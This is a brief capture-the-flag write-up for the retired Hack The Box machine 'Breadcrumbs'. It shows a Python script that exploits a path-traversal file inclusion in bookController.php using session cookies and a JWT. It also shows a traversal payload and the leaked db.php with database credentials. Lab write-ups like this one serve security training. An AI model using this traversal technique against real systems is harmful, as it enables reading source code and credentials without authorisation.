# Writing a python script to get source code of php files
This is a python script to get source code of php files.
```pythpn
import requests
import sys

if len(sys.argv) !=2:
    print("Usage:python3 lfi.py [path]")
    sys.exit()

url = 'http://10.10.10.228/includes/bookController.php'
cookies = {'PHPSESSID':'clarkey5ff7596fb91193d14067d301ce3595ce', 'token':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoiY2xhcmtleSJ9fQ.nTfWSoOyE4ClICCHZ5pBZQlE9XDoO2GRfmASDszmRe0'}
data = {'book':sys.argv[1],'method':'1'}

r = requests.post(url, data=data,cookies=cookies)
print(bytes(r.text,"utf-8").decode('unicode_escape').strip('"'))
```
Like this we can get php code of db.php
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../db/db.php
```
```php
<?php

$host="localhost";
$port=3306;
$user="bread";
$password="jUli901";
$dbname="bread";

$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
?>
```
